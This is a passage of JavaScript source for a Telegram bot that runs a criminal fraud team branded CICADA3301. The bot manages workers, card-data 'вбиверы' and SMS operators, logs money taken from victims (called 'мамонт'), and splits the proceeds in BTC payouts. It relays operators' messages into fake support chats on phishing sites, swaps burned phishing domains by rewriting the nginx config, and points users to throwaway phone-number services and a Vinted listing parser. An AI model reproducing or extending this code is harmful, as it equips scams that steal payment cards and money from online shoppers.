        let msg = await bot.telegram.sendMessage(log.wid, `👉 CICADA3301\n\nВаша выплата в размере ${log.profit} RUB отправлена на ваш BTC кошелёк, зачисление средств может занять какое-то время до 3х подтверждений транзакции или раньше.\n\n📊 В ближайшее время вам отправят транзакцию.\n👨‍💻 Обработал вашу выплату: ${ctx.from.username}`)
        await ctx.reply("🌒 Вы отметили выплаченный профит. Чтобы отправить воркеру транзакцию выделите это сообщение и отправьте транзакцию.\n\n🌒 WID: " + log.wid + `\n🌒 MSG ID: ${msg.message_id}`)
    }

    if (clb.data == "@dellpay:"){
        let log = JSON.parse(readFileSync(`database/profits/${clb.message.text.match(/💸 Профит №(.+)/)[1]}`))

        bot.telegram.deleteMessage(cfg.payouts, log.msg_id)

        unlinkSync(`database/profits/${clb.message.text.match(/💸 Профит №(.+)/)[1]}`)
        unlinkSync(`database/maindb/${log.wid}/profits/${log.wpid}`)
        unlinkSync(`database/kassa/${log.kid}`)
        ctx.editMessageText(clb.message.text + "\n ❌ Профит удалён.", {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 9) == "@wmentor:"){
        let id = clb.data.replace("@wmentor:", "")

        if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == true) return ctx.reply("У вас уже есть наставник! Вы можете от него отказаться командой /leavementor")

        writeFileSync("database/maindb/" + ctx.from.id + "/mpr", String(readdirSync("database/maindb/" + ctx.from.id + "/profits/").length+3))
        writeFileSync("database/maindb/" + ctx.from.id + "/mentor", String(id))
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) - 5))

        bot.telegram.sendMessage(id, "👨‍🎓 У вас появился новый ученик - @" + ctx.from.username + "! (#" + readFileSync("database/maindb/" + ctx.from.id + "/tag") + ")")
        ctx.reply("👨‍🎓 Отлично! Теперь вы стали учеником #" + readFileSync("database/maindb/" + id + "/tag") + ". Вы можете связаться с ним через кнопку ниже.", Markup.inlineKeyboard([
            [
                Markup.button.url(`#${readFileSync("database/maindb/" + id + "/tag")}`, "tg://user?id=" + id)
            ]
        ]))
    }

    if (clb.data == "contacts"){
        return ctx.editMessageCaption("👨‍👩‍👦 Контакты\n\n🌍 Владелец ТС :\n@CICADA3301_BOSS\n\n🌐 Жалобы и предложения :\n@CICADA3301_logistics", Markup.inlineKeyboard([[Markup.button.callback("Назад", "tomenu")]]))
    }
    
    if (clb.data.substring(0, 11) == "@go_mentor:"){
        let id = clb.data.replace("@go_mentor:", "")

        if (existsSync("database/mentors/" + id) == true){
            ctx.editMessageCaption(`👨‍🏫 #${readFileSync("database/maindb/" + id + "/tag")}\n\n${decodeURIComponent(JSON.parse(readFileSync("database/mentors/" + id))['text'])}`, {reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("👨‍🎓 Стать учеником", "@wmentor:" + id),
                        Markup.button.callback("Назад", "mentors"),
                        
                    ]
                ]
            }})
        }else{
            ctx.reply("Данный наставник был уволен, возможно вам стоит выбрать нового.")
        }
    }

    if (clb.data == "rukovodstvo"){
        ctx.editMessageCaption("", Markup.inlineKeyboard([
            [
                Markup.button.callback("📱 Номера", "numbers"),
                Markup.button.url("📚 Мануалы.", "https://t.me/CICADA3301_MANUAL"),
            ],
            [
                Markup.button.callback("Меню", "tomenu")
            ]
        ]))
    }

    if (clb.data == "numbers"){
        ctx.editMessageCaption("📱 Номера для регистрации мессенджера и аккаунтов.\n\n✅ @SMSBest_bot\n✅ onlinesim.ru\n✅ 5sim.net\n✅ @GreedySMSbot\n✅ sms-activate.ru\n✅ @Jeazz19", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "tomenu")
            ]
        ]))
    }



    if (clb.data == "checkOnline"){
            let id = clb.message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[1]
            let service = clb.message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[2]
          if (existsSync(`../${service}/chat_src/data/${id}.json`)){
    
            let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "testOnline", "message": "${encodeURI(ctx.message.text.replace(/"/g, "'"))}"}]`)
    
          }else{
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "testOnline", "message": "1"}]`)
          }
          ctx.reply("✴️ Запрос отправлен, ответ прийдёт в случае если мамонт на сайте.", {reply_to_message_id: clb.message.message_id})
    }

    if (clb.data == "gomenu"){
        ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n👨‍💻 Вбиверы\n${hand()}\n📩 SMS\n${sms()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    }

    if (clb.data == "mentors"){
        if (readdirSync("database/mentors/").length == 0){
            ctx.editMessageCaption("К сожалению в данный момент у нас нету наставников.\n\n❗️ Вы всегда можете подать заявку на Наставничество через раздел Контакты.", Markup.inlineKeyboard([[Markup.button.callback("В Меню", "tomenu")]]))
        }else{
            let mentors_selector = [[]]

            readdirSync("database/mentors/").forEach(mentor => {
                mentors_selector.push([{text: `👨‍🏫 #${readFileSync("database/maindb/" + mentor + "/tag")}`, callback_data: `@go_mentor:${mentor}`}])
            })

            mentors_selector.push([{text: `В меню`, callback_data: `tomenu`}])

            ctx.editMessageCaption("<b>-></b> Здесь вы можете выбрать наставника который в будущем поможет вам и поможет сделать профит. За это вы будете отдавать 5% с каждого профита наставнику, вы сможете отказаться от наставника после 3х профитов.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: mentors_selector })
        })
        }
    }

    if (clb.data == "bug/domain") return ctx.scene.enter("bgd", ctx.scene.stage)

    if (clb.data == "tomenu"){
        return ctx.editMessageCaption(`❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n👨‍💻 Вбиверы\n${hand()}\n📩 SMS\n${sms()}`, {reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    }
    
    if (clb.data == "chats"){
        return ctx.editMessageCaption(`☁️ Чаты CICADA 3301.\n\n❗️ Вы можете увидеть все доступные и актуальные ссылки нажав на кнопки ниже.`, Markup.inlineKeyboard([
            [
                Markup.button.url("Общий чат", cfg.chat),
                Markup.button.url("Профиты", cfg.profits)
            ],
            [
                Markup.button.callback("❕ В меню", "tomenu")
            ]
        ]))
    }

    if (clb.data == "changedomain") {
        var ndomain = readdirSync("database/domains/")[0]
        ctx.reply("Установлен новый домен: " + ndomain)
        writeFileSync("database/domain", ndomain)
        writeFileSync("/etc/nginx/sites-available/default", readFileSync("/etc/nginx/sites-available/default").toString("utf-8").replace(new RegExp(_local.pldomain, 'g'), ndomain))
      _local.pldomain = ndomain
    unlinkSync("database/domains/" + readdirSync("database/domains/")[0])
    exec("systemctl restart nginx", async (error, stdout, stderr) => {
    if (error) {
        ctx.reply("Ошибка смены домена!");
        return;
    }
    if (stderr) {
        ctx.reply("Ошибка смены домена!");
        return;
    }
      ctx.reply("Домен успешно сменён!")  
      bot.telegram.sendMessage(cfg.payouts, `⚠️ Смена домена! ⚠️\nАдминистратор сменил домен, продолжайте работу по новым ссылкам!`)
});
  }

    if (clb.data == "goreg"){
        if (existsSync("database/attempts/" + ctx.from.id) == false){
            ctx.scene.enter("register", ctx.scene.stage)
        }else{
            ctx.reply("Вы уже подали заявку, ожидайте решения администрации.")
        }
    }

    if (clb.data.substring(0,9) == "/settings"){
        ctx.editMessageCaption("", _local.countrys["settings"])
    }

    if (clb.data.substring(0,9) == "@country:"){
        if (existsSync("database/maindb/" + ctx.from.id + "/btc") == false) return ctx.reply("Вам необходимо установить BTC кошелёк.")
        ctx.editMessageCaption("", _local.countrys[clb.data.replace("@country:", "")])
    }
    if (clb.data == "callMenu") return ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n👨‍💻 Вбиверы\n${hand()}\n📩 SMS\n${sms()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    if (clb.data.substring(0, 8) == "@accept:"){
        let id = clb.data.match(/@accept:(.+)/)[1]
        createUser(id)
        writeFileSync("database/users/" + id, ctx.from.username)
        await bot.telegram.sendMessage(id, "✅ Ваша заявка на вступление была одобрена.")
        await bot.telegram.sendMessage(id, "Полезные ссылки.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "gomenu")
            ],
            [
                Markup.button.url("Общий чат", cfg.chat)
            ],
            [
                Markup.button.url("Профиты", cfg.profits)
            ]
        ]))
        ctx.editMessageText(clb.message.text + "\n\n✅ Одобрена @" + ctx.from.username)
    }
    if (clb.data.substring(0, 11) == "@disaccept:"){
        let id = clb.data.match(/@disaccept:(.+)/)[1]
        bot.telegram.sendMessage(id, "❌ Ваша заявка на вступление была отклонена.")
        unlinkSync("database/attempts/" + id)
        ctx.editMessageText(clb.message.text + "\n\n❌ Отклонена @" + ctx.from.username)
    }
    if (clb.data.substring(0, 10) == "@disblock:"){
        let id = clb.data.match(/@disblock:(.+)/)[1]
        writeFileSync("database/block/" + id, ctx.from.username)
        ctx.editMessageText(clb.message.text + "\n\n❌ Отклон+Блок @" + ctx.from.username)
        bot.telegram.sendMessage(id, "Вы были заблокированы.")
    }

    if (clb.data.substring(0, 7) == "@block:"){
        let id = clb.data.match(/@block:(.+)/)[1]
        writeFileSync("database/block/" + id, ctx.from.username)
        ctx.reply("Заблокирован.")
        chats.forEach(chat => {
            bot.telegram.kickChatMember(chat, id)
        })
        bot.telegram.sendMessage(id, "Вы были заблокированы. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@giveadm:"){
        let id = clb.data.split(":")[1]
        writeFileSync("database/admins/" + id, ctx.from.username)
        ctx.reply("Админка выдана!")
        bot.telegram.sendMessage(id, "Вам выдали админку. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@takeadm:"){
        let id = clb.data.split(":")[1]
        unlinkSync("database/admins/" + id)
        ctx.reply("Пользователь больше не администратор.")
        bot.telegram.sendMessage(id, "У вас забрали админку. @" + ctx.from.username)
    }
    if (clb.data.substring(0,12) == "@givementor:"){
        let id = clb.data.split(":")[1]
        writeFileSync("database/mentors/" + id, JSON.stringify({text: `${encodeURIComponent("Наставник еще не установил текст.")}`}))
        ctx.reply("Наставник выдан!")
        bot.telegram.sendMessage(id, "Вам выдали наставника. Используйте /mtext для изменения текста. @" + ctx.from.username)
    }
    if (clb.data.substring(0,12) == "@takementor:"){
        let id = clb.data.split(":")[1]
        unlinkSync("database/mentors/" + id)
        ctx.reply("Наставник снят.")
        bot.telegram.sendMessage(id, "У вас забрали наставника. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@unblock:"){
        let id = clb.data.split(":")[1]
        unlinkSync("database/block/" + id, ctx.from.username)
        ctx.reply("Разблокирован!")
        bot.telegram.sendMessage(id, "Вас разблокировали. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@givevbv:"){
        let id = clb.data.split(":")[1]
        writeFileSync("database/handers/" + id, ctx.from.username)
        ctx.reply("Выдан вбивер.")
        bot.telegram.sendMessage(id, "Вам выдали статус вбивера. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@takevbv:"){
        let id = clb.data.split(":")[1]
        unlinkSync("database/handers/" + id)
        ctx.reply("Отобрали вбивера.")
        bot.telegram.sendMessage(id, "Вы больше не вбивер. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@givesms:"){
        let id = clb.data.split(":")[1]
        writeFileSync("database/smser/" + id, ctx.from.username)
        ctx.reply("Выдан СМСер.")
        bot.telegram.sendMessage(id, "Вам выдали статус вбивера. @" + ctx.from.username)
    }
    if (clb.data.substring(0,9) == "@takesms:"){
        let id = clb.data.split(":")[1]
        unlinkSync("database/smser/" + id)
        ctx.reply("Отобрали СМСера.")
        bot.telegram.sendMessage(id, "Вы больше не SMSer. @" + ctx.from.username)
    }
})

bot.use((ctx, next) => {
    if (ctx.message.text != "undefined" && ctx.message.text.toLowerCase().includes("на вбив")) return ctx.reply(`<b>👨‍💻 Вбиверы</b>\n${vhand()}\n\n<b>📩 SMS</b>\n${vsms()}`, {parse_mode: "HTML", disable_web_page_preview: "true", reply_to_message_id: ctx.message.message_id})
    
    if (ctx.chat.type != "private") return false
    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("Вы были заблокированы. Свяжитесь с администрацией.")
    }
    if (ctx.from.username == "undefined"){
        return ctx.reply("Установите @username!")
    }

    if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == true){
        let id = readFileSync("database/maindb/" + ctx.from.id + "/mentor").toString("utf-8")
        if (existsSync("database/mentors/" + id) == false){
            unlinkSync("database/maindb/" + ctx.from.id + "/mentor")
            unlinkSync("database/maindb/" + ctx.from.id + "/mpr")
            ctx.reply("К сожалению ваш наставник был снят с должности. Вы автоматически от него удалены.")
        }
    }

    writeFileSync("database/id_db/" + ctx.from.username.replace(/_/g, "(zzz)").toLowerCase(), String(ctx.from.id))


    if (existsSync("database/users/" + ctx.from.id) == false){
        ctx.reply("🥷 Мы не увидели что вы зарегестрированы в нашей системе, советуем это исправить.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Зарегистрироваться", "goreg")
            ]
        ]))
    }else{
        next()
    }
})

bot.command("mtext", (ctx) => {
    if (existsSync("database/mentors/" + ctx.from.id) == false) return ctx.reply("Вы не наставник.")
    if (ctx.message.text == "/mtext") return ctx.reply("Вы должны ввести текст оформления. Пример: /mtext Text")

    let text = encodeURIComponent(ctx.message.text.replace("/mtext", ""))

    writeFileSync("database/mentors/" + ctx.from.id, JSON.stringify({text: text}))
    ctx.reply("Вы успешно сменили текст!")
})

bot.command("leavementor", (ctx) => {
    if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == false) return ctx.reply("У вас нету наставника.")
    if (recentMentor(ctx.from.id) == "Вы можете отказаться"){
        unlinkSync("database/maindb/" + ctx.from.id + "/mpr")
        unlinkSync("database/maindb/" + ctx.from.id + "/mentor")
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) + 5))
    }else{
        ctx.reply("Вы не можете отказаться от наставника, Вам " + recentMentor(ctx.from.id))
    }
})



bot.command("master_btc", (ctx) => {
    if (ctx.message.text == "/master_btc") return ctx.reply("/master_btc btc")
    writeFileSync(`database/maindb/${ctx.from.id}/btc`, String(ctx.message.text.match(/\/master_btc (.+)/)[1]))
    ctx.reply("OK")
})

bot.command("uinfo", (ctx) => {
    if (existsSync(`database/admins/${ctx.from.id}`) == false) return;

    let uid = ctx.message.text.match(/\/uinfo (.+)/)[1].replace("@", "").replace(/_/g, "(zzz)").toLowerCase()
    ctx.reply(uid)
    
    if (existsSync(`database/id_db/${uid}`) == true){

        let rpid = readFileSync(`database/id_db/${uid}`).toString("utf-8")
        
        let rpl = `<b>☁️ Профиль ${ctx.message.text.match(/\/uinfo (.+)/)[1]}</b>\n`
        rpl += `\n<b>🙅‍♂️ Тэг</b>: #${readFileSync("database/maindb/" + rpid + "/tag")}`
        rpl += `\n<b>💸 Кол-во профитов</b>: ${readdirSync("database/maindb/" + rpid + "/profits/").length}`
        rpl += `\n<b>🤑 Сумма профитов</b>: ${getProfits(rpid)} USD`
        rpl += `\n<b>👨‍🏫 Наставник</b>: ${existsSync("database/maindb/" + rpid + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + rpid + "/mentor"))['tag']) + " (" + recentMentor(rpid) + ")</b>": "<b>Нету</b>."}`
        rpl += `\n\n<b>🤟 Взаимодействуйте через панель нижe</b>.`

        ctx.reply(rpl, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    (existsSync(`database/admins/` + rpid) == false) ? Markup.button.callback("👉 Выдать админку", "@giveadm:" + rpid) : Markup.button.callback("Забрать админку 👈", "@takeadm:" + rpid)
                ],
                [
                    (existsSync(`database/block/` + rpid) == false) ? Markup.button.callback("👉 Заблокировать", "@block:" + rpid) : Markup.button.callback("Разблокировать 👈", "@unblock:" + rpid)
                ],
                [
                    (existsSync(`database/handers/` + rpid) == false) ? Markup.button.callback("👉 Выдать вбивера", "@givevbv:" + rpid) : Markup.button.callback("Забрать вбивера 👈", "@takevbv:" + rpid)
                ],
                [
                    (existsSync(`database/smser/` + rpid) == false) ? Markup.button.callback("👉 Выдать SMSer Status", "@givesms:" + rpid) : Markup.button.callback("Забрать SMSer Status 👈", "@takesms:" + rpid)
                ],
                [
                    (existsSync(`database/mentors/` + rpid) == false) ? Markup.button.callback("👉 Выдать наставника", "@givementor:" + rpid) : Markup.button.callback("Забрать наставника 👈", "@takementor:" + rpid)
                ]
            ]
        }})
        


    }else return ctx.reply("Пользователь не обнаружен в базе данных.")

    
})

bot.command("alert", (ctx) => {
    if (existsSync(`database/admins/${ctx.from.id}`) == false) return;

     ctx.scene.enter("invest", ctx.scene.stage) 
})

bot.command("newdomain", (ctx) => {
    if (existsSync(`database/admins/${ctx.from.id}`) == false) return;

     ctx.scene.enter("adddmns", ctx.scene.stage) 
})

bot.command("start", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n👨‍💻 Вбиверы\n${hand()}\n📩 SMS\n${sms()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})

bot.command("domainmanager", (ctx) => {
    if (existsSync(`database/admins/${ctx.from.id}`) == false) return;

    let rpl = "🌐 Система менеджирования доменов.\n\n🏅 Текущий домен: " + _local.pldomain

    if (readdirSync("database/domains/").length == 0){
        rpl += "\n😢 Нету доменов в запасе."
    }else{
        let dmns = ""
        
        readdirSync("database/domains/").forEach(dmn => {
            dmns += `${dmn}\n`
        })

        rpl += `\n🕸 ${readdirSync("database/domains/").length} доменов в запасе\n\n${dmns}`
    }

    ctx.reply(rpl, Markup.inlineKeyboard([
        [
            Markup.button.callback("Сменить домен", "changedomain")
        ]
    ]))

})

bot.command("tops", (ctx) => {
  
    let state = []
    readdirSync("database/maindb/").forEach(user => state.push([readFileSync("database/maindb/" + user + "/tag").toString("utf-8").replace("\n", ""), getProfits(user)]));
    state.sort(function(a, b) {
        return a[1] - b[1];
    });
    state = state.reverse()
    let stats = "❗️ Топ 10 воркеров за всё время CICADA!\n\n"
    for (let i = 1; i<11; i++){
      stats += `${i}. #<b>${state[i-1][0]}</b> - <b>${state[i-1][1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")} USD</b>\n`
    }
    ctx.reply(stats, {parse_mode: "HTML"})
  
  
  })

bot.command("parse", async(ctx) => {
    console.log(await parse_vinted(ctx.message.text.replace("/parse ", "")))
})


bot.command("main", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n👨‍💻 Вбиверы\n${hand()}\n📩 SMS\n${sms()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})

bot.on("message", (ctx) => {
    if (typeof ctx.message.reply_to_message != "undefined"){
        if (ctx.message.reply_to_message.text.includes("❇️ Трек номер:")){
        let id = ctx.message.reply_to_message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[1]
        let service = ctx.message.reply_to_message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[2]
        if (ctx.message.text.includes('"') == true){
            ctx.reply(`Символы которые вы указали "" запрещены поэтому они были автоматически заменены на ''.`)
        }
        if (existsSync(`../${service}/chat_src/data/${id}.json`)){
    
            let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
    
        }else{
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
        }
        ctx.reply("Сообщение передано.", {reply_to_message_id: ctx.message.message_id})
        }else if (ctx.message.reply_to_message.text.includes("🌒 Вы отметили выплаченный профит.")){
            
            bot.telegram.sendMessage(ctx.message.reply_to_message.text.match(/🌒 WID: (.+)/)[1], `📊 Транзакция от этой выплаты: ${ctx.message.text}`, {reply_to_message_id: ctx.message.reply_to_message.text.match(/🌒 MSG ID: (.+)/)[1]})
            ctx.reply("Транзакция отправлена.")
        }
  }else{
      if (ctx.message.text.includes("🌒 ID:") == true) {
          let _pid = ctx.message.text.match(/🌒 ID: (.+)/)[1]
          let _pjs = JSON.parse(readFileSync(`database/profits/${_pid}`).toString("utf-8"))

          let rpl = "<b>💸 Профит №" + _pid + "</b>\n\n"
          rpl += "<b>👨‍💻 Воркер</b>: @" + _pjs['w'] + "\n"
          rpl += "<b>🧑‍🏭 Вбивер</b>: @" + _pjs['hander'] + "\n"
          rpl += "📊 <b>BTC</b>: <code>" + readFileSync(`database/maindb/${_pjs['wid']}/btc`) + "</code>\n\n"
          rpl += "👉 <b>Сумма профита</b>: " + _pjs['profit'].replace(/\B(?=(\d{3})+(?!\d))/g, " ") + " "+ _pjs['valute'] +"\n"
          rpl += "💸 <b>Сумма к выплате</b>: " + String(Math.round(percent(_pjs['profit'], _pjs['percen']))).replace(/\B(?=(\d{3})+(?!\d))/g, " ") + " " + _pjs['valute']

          ctx.reply(rpl, {parse_mode: "HTML", reply_markup: {
              inline_keyboard: [
                [
                    Markup.button.callback("✅ Выплачено", "@succpay:")
                ],
                [
                    Markup.button.callback("❌ Удалить выплату", "@dellpay:")
                ],
              ]
          }})
      }
  }
})







bot.catch(err => console.log(err))
bot.launch()
